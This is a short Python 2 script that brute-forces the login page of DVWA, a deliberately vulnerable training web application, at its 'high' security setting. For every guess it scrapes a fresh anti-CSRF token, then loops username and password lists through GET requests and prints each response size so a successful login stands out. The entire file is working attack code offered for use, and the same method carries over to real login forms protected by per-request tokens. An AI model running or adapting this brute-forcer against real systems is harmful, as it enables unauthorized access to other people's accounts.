from bs4 import BeautifulSoup
import urllib2
#----------------------------
#-------Code by Pers0na_-----
#----------------------------
header={        'Host': 'XXX.XXX.XXX.XXX',
	#	'Cache-Control':'max-age=0',
	#	'If-None-Match':"307-52156c6a290c0",
	#	'If-Modified-Since':'Mon, 05 Oct 2015 07:51:07 GMT',
		'User-Agent':'Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0',
		'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Referer':'http://XXX.XXX.XXX.XXX/dvwa/vulnerabilities/brute/',
		'Accept-Encoding':'gzip, deflate',
		'Accept-Language':'en-US,en;q=0.5',
		'Cookie':'security=high; PHPSESSID=veiqcinu4ktb36fmsg30gmvt96'}
requrl = "http://XXX.XXX.XXX.XXX/dvwa/vulnerabilities/brute/"
#----------------------------

#----------------------------
def get_token(requrl,header):
	req = urllib2.Request(url=requrl,headers=header)
	response = urllib2.urlopen(req)
#	print response.getcode(),
	the_page = response.read()
#	print len(the_page)
	soup = BeautifulSoup(the_page,"html.parser")
	#get the user_token
        d = soup.find_all('input',attrs={'name':'user_token'})
        user_token = d[0].attrs['value']
        return user_token
#user_token = get_token(requrl,header)
#----------------------------

#---------------------------- 
def force_status(requrl,header):
	req = urllib2.Request(url=requrl,headers=header)
	response = urllib2.urlopen(req)
	print response.getcode(),
	the_page = response.read()
	print len(the_page)

#----------------------------

#---------------------------- 		
i = 0
j = 0
with open('userlist.txt','r') as u:
	ulist = u.readlines()
	for line1 in ulist:
		strlist =line1.split(' ')
		for i in range(len(strlist)):
			with open('sample.txt','r') as k:
				k.seek(0)
				for line in k:
					req_user_token = get_token(requrl,header)
					att_requrl = "http://XXX.XXX.XXX.XXX/dvwa/vulnerabilities/brute/"+"?username="+strlist[i].strip()+"&password="+line.strip()+"&Login=Login&user_token="+req_user_token
					j += 1					
					print j,strlist[i].strip(),line.strip(),
					force_status(att_requrl,header)
					#user_token = get_token(requrl,header)
				else:
					i += 1